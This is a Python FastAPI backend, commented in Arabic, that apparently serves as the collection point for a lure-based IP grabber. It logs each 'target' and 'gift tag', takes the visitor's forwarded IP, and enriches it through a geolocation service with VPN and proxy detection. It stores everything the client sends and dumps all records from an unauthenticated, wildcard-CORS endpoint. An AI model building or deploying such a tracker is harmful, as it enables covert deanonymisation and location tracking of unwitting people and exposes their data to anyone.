from fastapi import FastAPI, Request
from fastapi.middleware.cors import CORSMiddleware
import psycopg2
from psycopg2.extras import RealDictCursor
import os, json, requests

app = FastAPI()

DB_URL = os.environ.get("DATABASE_URL")

app.add_middleware(
    CORSMiddleware,
    allow_origins=["*"],
    allow_methods=["*"],
    allow_headers=["*"],
)

def get_db_conn():
    return psycopg2.connect(DB_URL, sslmode='require')

@app.on_event("startup")
def setup_db():
    conn = get_db_conn()
    cur = conn.cursor()
    # إنشاء جدول مرن جداً يستوعب كل شيء JSON
    cur.execute("""
        CREATE TABLE IF NOT EXISTS luvra_omega_intel (
            id SERIAL PRIMARY KEY,
            target_id TEXT,
            gift_tag TEXT,
            ip_address TEXT,
            geo_data JSONB,
            all_metrics JSONB,
            created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
        );
    """)
    conn.commit()
    cur.close()
    conn.close()

@app.post("/api/v1/gate/collect")
async def collect_intel(request: Request):
    # سحب الـ IP الحقيقي حتى لو خلف 10 جدران حماية
    client_ip = request.headers.get("x-forwarded-for", request.client.host).split(',')[0]
    try:
        payload = await request.json()
        # سحب بيانات IP استخباراتية (كشف VPN, Proxy, Hosting, Mobile Data)
        geo = requests.get(f"http://ip-api.com/json/{client_ip}?fields=16777215").json()
        
        conn = get_db_conn()
        cur = conn.cursor()
        cur.execute("""
            INSERT INTO luvra_omega_intel (target_id, gift_tag, ip_address, geo_data, all_metrics)
            VALUES (%s, %s, %s, %s, %s)
        """, (
            payload.get('target_id'),
            payload.get('gift_tag'),
            client_ip,
            json.dumps(geo),
            json.dumps(payload)
        ))
        conn.commit()
        cur.close()
        conn.close()
        return {"status": "SUCCESS"}
    except Exception as e:
        print(f"FAILED: {e}")
        return {"status": "FAIL"}

@app.get("/api/v1/analytics/full")
async def get_all_data():
    conn = get_db_conn()
    cur = conn.cursor(cursor_factory=RealDictCursor)
    cur.execute("SELECT * FROM luvra_omega_intel ORDER BY created_at DESC")
    data = cur.fetchall()
    cur.close()
    conn.close()
    return data
